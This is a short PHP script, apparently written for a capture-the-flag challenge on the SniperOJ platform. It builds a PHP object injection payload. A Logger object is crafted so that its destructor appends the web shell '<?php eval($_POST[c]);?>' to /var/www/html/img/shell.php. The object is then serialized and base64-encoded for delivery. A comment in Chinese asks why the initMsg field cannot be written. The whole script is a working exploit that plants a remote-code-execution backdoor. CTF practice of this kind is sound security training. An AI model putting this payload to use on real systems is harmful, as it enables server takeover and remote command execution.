<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg='大佬们 为什么这里 initMsg 写不了呀... 求解...';
            $this->exitMsg='<?php eval($_POST[c]);?>';
            $this->logFile = "/var/www/html/img/shell.php";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }

    $fake = new Logger('SniperOJ');
    echo base64_encode(serialize($fake));
